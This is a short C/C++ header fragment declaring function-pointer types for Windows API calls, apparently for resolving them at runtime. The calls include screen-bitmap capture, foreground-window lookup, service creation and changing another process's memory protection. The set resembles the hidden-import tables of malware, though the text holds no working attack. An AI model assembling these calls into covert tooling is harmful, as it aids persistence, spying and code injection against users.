typedef int ( WINAPI *typeGetDIBits)( HDC hdc, HBITMAP hbmp, UINT uStartScan, UINT cScanLines, LPVOID lpvBits, LPBITMAPINFO lpbi, UINT uUsage ); //GDI32
typedef HWND ( WINAPI *typeGetForegroundWindow)(); //USER32
typedef SC_HANDLE (WINAPI *typeCreateServiceA)( SC_HANDLE hSCManager, LPCTSTR lpServiceName, LPCTSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCTSTR lpBinaryPathName, LPCTSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCTSTR lpDependencies, LPCTSTR lpServiceStartName, LPCTSTR lpPassword );
typedef HLOCAL (WINAPI *typeLocalFree)( HLOCAL hMem );
typedef HLOCAL (WINAPI *typeLocalAlloc)( UINT uFlags, SIZE_T uBytes ); //KERNEL32
typedef BOOL (WINAPI *typeConvertSidToStringSidW)( PSID Sid, LPWSTR *StringSid ); //ADVAPI32
typedef BOOL (WINAPI *typeGetExitCodeThread)( HANDLE hThread, LPDWORD lpExitCode ); //KERNEL32
typedef DWORD (WINAPI *typeSetFilePointer)( HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod ); //KERNEL32
typedef BOOL (WINAPI *typeVirtualProtectEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); //KERNEL32
typedef BOOL (WINAPI *typeIsTextUnicode)( const VOID *lpv, int iSize, LPINT lpiResult ); //ADVAPI32
typedef int (WINAPIV *type_wcsicmp)( const wchar_t *string1, const wchar_t *string2 ); //NTDLL
